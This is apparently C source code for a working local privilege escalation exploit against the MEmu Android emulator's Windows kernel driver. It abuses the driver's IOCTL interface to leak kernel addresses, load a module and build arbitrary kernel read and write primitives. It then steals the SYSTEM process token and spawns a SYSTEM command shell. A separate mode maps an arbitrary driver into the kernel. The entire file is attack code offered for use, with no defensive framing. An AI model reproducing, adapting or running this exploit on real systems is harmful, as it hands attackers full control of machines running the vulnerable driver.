#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include "memu_suptable.h"

#define IOCTL_COOKIE        0x228204u
#define IOCTL_QUERY_FUNCS   0x228208u
#define IOCTL_LDR_OPEN      0x22820Cu
#define IOCTL_LDR_LOAD      0x228210u
#define IOCTL_PAGE_ALLOC_EX 0x228228u
#define IOCTL_CALL_VMMR0_BIG 0x22826Cu

#define COOKIE_MAGIC   0x69726f74u
#define SUPREQ_MAGIC   0x42000042u
#define SUP_IOC_VER    0x320000u
#define VMMR0REQ_MAGIC 0x19730211u

typedef struct { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } USTR;
typedef struct { ULONG Length; HANDLE Root; USTR *Name; ULONG Attr; void *sd,*sqs; } OBJATTR;
typedef struct { PVOID Info; ULONG_PTR St; } IOSB;
typedef LONG (WINAPI *pNtCreateFile)(HANDLE*,ACCESS_MASK,void*,void*,void*,ULONG,ULONG,ULONG,ULONG,void*,ULONG);
typedef LONG (WINAPI *pNtDevIoCtl)(HANDLE,HANDLE,void*,void*,void*,ULONG,void*,ULONG,void*,ULONG);

static HANDLE g_h;
static pNtCreateFile NtCreateFile_;
static pNtDevIoCtl   NtDevIoCtl_;
static uint32_t g_ck, g_sck;
static uint64_t g_pSession, g_pVM, g_hpvr0;

static void enable_priv(HANDLE tok, const char *name)
{
    TOKEN_PRIVILEGES tp; LUID luid;
    if(!LookupPrivilegeValueA(NULL,name,&luid)) return;
    tp.PrivilegeCount=1; tp.Privileges[0].Luid=luid;
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok,FALSE,&tp,sizeof tp,NULL,NULL);
}

static void pop_shell(void)
{
    HANDLE hTok=NULL,hDup=NULL;
    if(!OpenProcessToken(GetCurrentProcess(),
            TOKEN_DUPLICATE|TOKEN_QUERY|TOKEN_ASSIGN_PRIMARY|TOKEN_ADJUST_DEFAULT|
            TOKEN_ADJUST_SESSIONID|TOKEN_ADJUST_PRIVILEGES,&hTok)) goto fallback;
    if(!DuplicateTokenEx(hTok,MAXIMUM_ALLOWED,NULL,SecurityImpersonation,TokenPrimary,&hDup)) goto fallback;
    enable_priv(hDup,"SeTcbPrivilege");
    enable_priv(hDup,"SeAssignPrimaryTokenPrivilege");
    enable_priv(hDup,"SeIncreaseQuotaPrivilege");
    {
        DWORD sess=WTSGetActiveConsoleSessionId();
        if(sess!=0xFFFFFFFF) SetTokenInformation(hDup,TokenSessionId,&sess,sizeof sess);
    }
    {
        STARTUPINFOA si={sizeof si}; PROCESS_INFORMATION pi={0};
        si.lpDesktop=(char*)"winsta0\\default";
        si.dwFlags=STARTF_USESHOWWINDOW; si.wShowWindow=SW_SHOW;
        char cmd[64]; strcpy(cmd,"cmd.exe /k whoami & echo.");
        if(CreateProcessAsUserA(hDup,NULL,cmd,NULL,NULL,FALSE,CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi)){
            printf("[+] system shell\n"); return;
        }
        printf("[-] cpau %lu, local fallback\n",GetLastError());
    }
fallback:
    {
        STARTUPINFOA si={sizeof si}; PROCESS_INFORMATION pi={0};
        char cmd[64]; strcpy(cmd,"cmd.exe /k whoami");
        if(CreateProcessA(NULL,cmd,NULL,NULL,FALSE,CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi))
            printf("[+] system shell (local)\n");
        else
            printf("[-] spawn %lu\n",GetLastError());
    }
}

static void banner(void)
{
    printf(" _._     _,-'\"\"`-._\n");
    printf("(,-.`._,'(       |\\`-/|\n");
    printf("    `-.-' \\ ) -`( , o o)\n");
    printf("          `-    \\`_`\"'- _SiCk // afflicted.sh\n\n");
}

static void usage(void)
{
    printf(" usage: memupoc kaslr | lpe | load <signed.sys>\n\n");
}

static int ioctl_(uint32_t code, void *in, uint32_t il, void *out, uint32_t ol)
{
    IOSB io = {0};
    return (int)NtDevIoCtl_(g_h, NULL, NULL, NULL, &io, code, in, il, out, ol);
}

static void hdr(uint8_t *b, uint32_t cbIn, uint32_t cbOut)
{
    *(uint32_t*)(b+0)=g_ck; *(uint32_t*)(b+4)=g_sck; *(uint32_t*)(b+8)=cbIn;
    *(uint32_t*)(b+12)=cbOut; *(uint32_t*)(b+16)=SUPREQ_MAGIC; *(uint32_t*)(b+20)=0;
}

static int open_dev(void)
{
    HMODULE nt=GetModuleHandleA("ntdll.dll");
    NtCreateFile_=(pNtCreateFile)GetProcAddress(nt,"NtCreateFile");
    NtDevIoCtl_=(pNtDevIoCtl)GetProcAddress(nt,"NtDeviceIoControlFile");
    if(!NtCreateFile_||!NtDevIoCtl_) return 0;
    static wchar_t devu[32]; wcscpy(devu,L"\\Device\\MEmuDrv");
    USTR us; us.Buffer=devu; us.Length=(USHORT)(wcslen(devu)*2); us.MaximumLength=us.Length+2;
    OBJATTR oa={sizeof(oa),NULL,&us,0x40,NULL,NULL}; IOSB io={0};
    LONG r=NtCreateFile_(&g_h,GENERIC_READ|GENERIC_WRITE|SYNCHRONIZE,&oa,&io,
                         NULL,0,3,1,0x20,NULL,0);
    return r==0;
}

static int cookie(void)
{
    uint8_t b[0x38]; memset(b,0,sizeof b);
    hdr(b,0x30,0x38); *(uint32_t*)(b+0)=COOKIE_MAGIC;
    memcpy(b+0x18,"The Magic Word!",15);
    *(uint32_t*)(b+0x28)=SUP_IOC_VER; *(uint32_t*)(b+0x2c)=SUP_IOC_VER;
    if (ioctl_(IOCTL_COOKIE,b,0x30,b,0x38)!=0) return 0;
    g_ck=*(uint32_t*)(b+0x18); g_sck=*(uint32_t*)(b+0x1c);
    g_pSession=*(uint64_t*)(b+0x30);
    if (*(int32_t*)(b+0x14)!=0){ printf("[-] cookie rc=%d\n", *(int32_t*)(b+0x14)); return 0; }
    printf("[*] cookie   %08X / %08X\n", g_ck, g_sck);
    printf("[*] session  %016llX\n",(unsigned long long)g_pSession);
    return 1;
}

static uint64_t leak_drv(void)
{
    for(uint32_t sz=0x100; sz<0x5000; sz+=8){
        static uint8_t f[0x5000];
        memset(f,0,sizeof f); hdr(f,0x18,sz);
        if (ioctl_(IOCTL_QUERY_FUNCS,f,0x18,f,sz)!=0) continue;
        if (*(int32_t*)(f+0x14)!=0) continue;
        uint32_t cF=*(uint32_t*)(f+0x18);
        if(cF!=296) continue;
        uint64_t ys=0;
        for(int k=0;k<5;k++){
            uint64_t rt=*(uint64_t*)(f+0x20+(size_t)VOTE_IDX[k]*0x38+0x30);
            if((rt>>48)!=0xFFFF) continue;
            uint64_t cand=rt-(VOTE_PREF[k]-0x140000000ull);
            if(!ys) ys=cand;
        }
        if((ys>>48)!=0xFFFF) return 0;
        printf("[*] memudrv  %016llX\n",(unsigned long long)ys);
        return ys;
    }
    return 0;
}

static int load_driver(const char *path)
{
    char full[MAX_PATH]; GetFullPathNameA(path,MAX_PATH,full,NULL);
    FILE *f=fopen(full,"rb");
    if(!f){ printf("[-] no file %s\n", full); return 0; }
    uint8_t hb[0x1000];
    size_t got=fread(hb,1,sizeof hb,f); fclose(f);
    if(got<0x200){ printf("[-] tiny file\n"); return 0; }
    uint32_t pe=*(uint32_t*)(hb+0x3c);
    uint32_t soi=*(uint32_t*)(hb+pe+0x50);
    if(soi<0x1000 || soi>0x800000){ printf("[-] bad pe\n"); return 0; }

    char name[32]; const char *bs=strrchr(full,'\\'); const char *sl=strrchr(full,'/');
    const char *fn = bs>sl?bs+1:(sl?sl+1:full);
    strncpy(name,fn,31); name[31]=0;

    uint8_t b[0x148]; memset(b,0,sizeof b);
    hdr(b,0x148,0x28);
    *(uint32_t*)(b+0x18)=soi+16; *(uint32_t*)(b+0x1c)=soi;
    strcpy((char*)(b+0x20),name); strcpy((char*)(b+0x40),full);
    LONG s=ioctl_(IOCTL_LDR_OPEN,b,0x148,b,0x28);
    int32_t rc=*(int32_t*)(b+0x14);
    uint64_t base=*(uint64_t*)(b+0x18);
    if(s!=0 || rc!=0){
        printf("[-] load rc=%d (-9=already mapped, -619=ci rejected, -610=file?)\n", rc);
        return 0;
    }
    if(b[0x20]) printf("[*] already loaded, base reused\n");
    printf("[+] %s mapped at %016llX native=%d\n", name,(unsigned long long)base,b[0x21]);
    return 1;
}

#define OFF_TOKEN        0x248
#define OFF_DRVINS_PVMR0 0x88
#define OFF_DRVINS_REQHND 0xA8
#define NT_RVA_IOCP      0x40D820ull
#define YS_IAT_IOCP      0x35178ull

static uint64_t load_vmm(void)
{
    uint32_t withE=0x18c00c;

    static const char *R0S[]={"C:\\Program Files\\Microvirt\\MEmuHyperv\\HPVR0.r0","C:\\memu\\HPVR0.r0",0};
    const char *r0p=R0S[0];
    { WIN32_FILE_ATTRIBUTE_DATA fa; int i=0;
      while(R0S[i]){ if(GetFileAttributesExA(R0S[i],0,&fa)){ r0p=R0S[i]; break; } i++; } }

    uint8_t b[0x148]; memset(b,0,sizeof b);
    hdr(b,0x148,0x28);
    *(uint32_t*)(b+0x18)=withE; *(uint32_t*)(b+0x1c)=0x18c000;
    strcpy((char*)(b+0x20),"HPVR0.r0"); strcpy((char*)(b+0x40),r0p);
    LONG s=ioctl_(IOCTL_LDR_OPEN,b,0x148,b,0x28);
    int32_t rc=*(int32_t*)(b+0x14);
    uint64_t base=*(uint64_t*)(b+0x18);
    printf("[*] ldropen  %016llX\n",(unsigned long long)base);
    if(s!=0||rc!=0||(base>>48)!=0xFFFF) return 0;
    if(!b[0x20]) return base;

    FILE *f=fopen(r0p,"rb");
    if(!f){ printf("[-] no r0\n"); return 0; }
    static uint8_t img[0x190000];
    uint32_t cb=(uint32_t)fread(img,1,sizeof img,f); fclose(f);
    if(cb<0x1000){ printf("[-] tiny r0\n"); return 0; }
    memset(img+cb,0,0x18c000-cb);

    uint32_t cbIn=0x78+withE;
    uint8_t *lb=(uint8_t*)calloc(1,cbIn);
    hdr(lb,cbIn,0x820);
    *(uint64_t*)(lb+0x18)=base+0x2e340;
    *(uint64_t*)(lb+0x20)=0;
    *(uint64_t*)(lb+0x28)=base;
    *(uint64_t*)(lb+0x30)=base+0x2dce0;
    *(uint64_t*)(lb+0x38)=base+0x2fe70;
    *(uint64_t*)(lb+0x40)=0;
    *(uint64_t*)(lb+0x48)=base;
    *(uint32_t*)(lb+0x50)=1;
    *(uint32_t*)(lb+0x54)=0x18c000;
    *(uint32_t*)(lb+0x68)=0x18c000;
    *(uint32_t*)(lb+0x6c)=1;
    *(uint32_t*)(lb+0x70)=withE;
    *(uint32_t*)(lb+0x74)=0;
    memcpy(lb+0x78,img,0x18c000);
    uint32_t *seg=(uint32_t*)(lb+0x78+0x18c000);
    seg[0]=0; seg[1]=0x40000000u|0x18c000; seg[2]=0;

    LONG s2=ioctl_(IOCTL_LDR_LOAD,lb,cbIn,lb,0x820);
    int32_t rc2=*(int32_t*)(lb+0x14);
    printf("[*] ldrload  ok\n");
    free(lb);
    if(s2!=0||rc2!=0) return 0;
    return base;
}

static LONG vmmr0_call2(uint64_t pVMR0, uint32_t uOp, uint8_t *inner, uint32_t cbInner, uint8_t *ob)
{
    uint8_t b[0x400]; memset(b,0,0x400); memset(ob,0,0x400);
    uint32_t cb=(uint32_t)(0x30+cbInner);
    hdr(b,cb,cb);
    *(uint64_t*)(b+0x18)=pVMR0;
    *(uint32_t*)(b+0x20)=0xFFFFFFFD;
    *(uint32_t*)(b+0x24)=uOp;
    *(uint64_t*)(b+0x28)=0;
    if(inner) memcpy(b+0x30,inner,cbInner);
    return ioctl_(IOCTL_CALL_VMMR0_BIG,b,cb,ob,cb);
}

static int lpe(uint64_t ys, uint64_t pu, uint64_t pk, int dry, uint64_t hpvr0_base)
{
    uint8_t b[0x58]; memset(b,0,sizeof b);
    hdr(b,0x58,0x58);
    *(uint64_t*)(b+0x18)=0;
    *(uint32_t*)(b+0x20)=0xFFFFFFFD;
    *(uint32_t*)(b+0x24)=0x20;
    *(uint32_t*)(b+0x30)=VMMR0REQ_MAGIC;
    *(uint32_t*)(b+0x34)=0x28;
    *(uint64_t*)(b+0x38)=g_pSession;
    *(uint32_t*)(b+0x40)=1;
    LONG s=ioctl_(IOCTL_CALL_VMMR0_BIG,b,0x58,b,0x58);
    if(s!=0 || *(int32_t*)(b+0x14)!=0){ printf("[-] createvm rc=%d\n", *(int32_t*)(b+0x14)); return 0; }
    g_pVM=*(uint64_t*)(b+0x50);
    printf("[*] vm       %016llX\n",(unsigned long long)g_pVM);
    if((g_pVM>>48)!=0xFFFF){ printf("[-] vm\n"); return 0; }

    if((hpvr0_base>>48)!=0xFFFF){ printf("[-] vmm base\n"); return 0; }
    g_hpvr0 = hpvr0_base;
    #define G_KRD  0xca562ull
    #define G_KWR  0xf706cull

    uint8_t *low=(uint8_t*)VirtualAlloc((LPVOID)0x30000000,0x1000,MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);
    if(!low){ printf("[-] alloc\n"); return 0; }

    uint8_t *ctrl=(uint8_t*)(pu+0x400);
    *(uint64_t*)(ctrl+OFF_DRVINS_PVMR0)=g_pVM;

    LONG pdm(uint64_t gadget, uint64_t r8, uint32_t rdx)
    {
        *(uint64_t*)(ctrl+OFF_DRVINS_REQHND)=g_hpvr0+gadget;
        uint8_t inner[0x20]; memset(inner,0,sizeof inner);
        *(uint32_t*)(inner+0)=VMMR0REQ_MAGIC;
        *(uint32_t*)(inner+4)=0x20;
        *(uint64_t*)(inner+8)=pk+0x400;
        *(uint32_t*)(inner+0x10)=rdx;
        *(uint64_t*)(inner+0x18)=r8;
        uint8_t ob[0x400];
        return vmmr0_call2(g_pVM,320,inner,0x20,ob);
    }
    uint32_t krd32(uint64_t a)
    {
        *(uint32_t*)(low+0xc)=0xCCCCCCCC;
        if(pdm(G_KRD, a-8, (uint32_t)(0x30000000))!=0) return 0xDEAD0000;
        return *(uint32_t*)(low+0xc);
    }
    uint64_t krd64(uint64_t a){ return (uint64_t)krd32(a)|((uint64_t)krd32(a+4)<<32); }
    int kwr32(uint64_t a, uint32_t v)
    {
        *(uint32_t*)(ctrl+0x61c4)=v;
        return pdm(G_KWR, a, 0)==0;
    }
    int kwr64(uint64_t a, uint64_t v){ return kwr32(a,(uint32_t)v)&&kwr32(a+4,(uint32_t)(v>>32)); }

    uint64_t nt = krd64(ys+YS_IAT_IOCP) - NT_RVA_IOCP;
    if((nt>>48)!=0xFFFF || (krd32(nt)&0xFFFF)!=0x5A4D){ printf("[-] nt %016llX\n",(unsigned long long)nt); return 0; }
    printf("[*] ntoskrnl %016llX\n",(unsigned long long)nt);
    if(dry) return 1;

    uint64_t sys = krd64(nt+0xFC6AF0);
    if((sys>>48)!=0xFFFF || krd32(sys+0x1D0)!=4){ printf("[-] sys\n"); return 0; }
    printf("[*] system   %016llX\n",(unsigned long long)sys);

    uint32_t myPid=GetCurrentProcessId();
    uint64_t me=0, cur=sys;
    for(int i=0;i<500 && !me;i++){
        uint64_t flink=krd64(cur+0x1D8);
        uint64_t next=flink-0x1D8;
        if((next>>48)!=0xFFFF) break;
        if(krd32(next+0x1D0)==myPid){ me=next; break; }
        cur=next;
        if(cur==sys) break;
    }
    if(!me){ printf("[-] self\n"); return 0; }
    printf("[*] self     %016llX\n",(unsigned long long)me);

    uint64_t tok = krd64(sys+OFF_TOKEN);
    printf("[*] systoken %016llX\n",(unsigned long long)tok);
    kwr64(me+OFF_TOKEN, tok);
    if(krd64(me+OFF_TOKEN)!=tok){ printf("[-] swap\n"); return 0; }
    printf("[!] swapping token\n");
    return 1;
}

int main(int argc, char **argv)
{
    banner();
    if(argc<2){ usage(); return 0; }
    int want_kaslr=!strcmp(argv[1],"kaslr");
    int want_lpe  =!strcmp(argv[1],"lpe");
    int want_load =!strcmp(argv[1],"load") && argc>2;
    if(!want_kaslr && !want_lpe && !want_load){ usage(); return 0; }

    if(!open_dev()) { printf("[-] dev\n"); return 1; }
    if(!cookie())   { printf("[-] cookie\n"); return 1; }

    if(want_load) return load_driver(argv[2])?0:1;

    uint64_t ys=leak_drv();
    if(!ys){ printf("[-] memudrv\n"); return 1; }

    uint8_t b2[0xC0]; memset(b2,0,sizeof b2);
    hdr(b2,0x20,0xA8);
    *(uint32_t*)(b2+0x18)=0x10; b2[0x1c]=1; b2[0x1d]=1;
    if(ioctl_(IOCTL_PAGE_ALLOC_EX,b2,0x20,b2,0xA8)!=0 || *(int32_t*)(b2+0x14)!=0){
        printf("[-] page\n"); return 1; }
    uint64_t pu=*(uint64_t*)(b2+0x18), pk=*(uint64_t*)(b2+0x20);
    if((pk>>48)!=0xFFFF){ printf("[-] page k\n"); return 1; }
    printf("[*] pages    user=%016llX kernel=%016llX\n",(unsigned long long)pu,(unsigned long long)pk);

    uint64_t hpvr0=load_vmm();
    if(!hpvr0){ printf("[-] vmm load\n"); return 1; }
    printf("[*] hpvr0    %016llX\n",(unsigned long long)hpvr0);

    if(want_kaslr){
        if(lpe(ys,pu,pk,1,hpvr0)) printf("[*] done\n");
        return 0;
    }

    if(lpe(ys,pu,pk,0,hpvr0)) pop_shell();
    return 0;
}
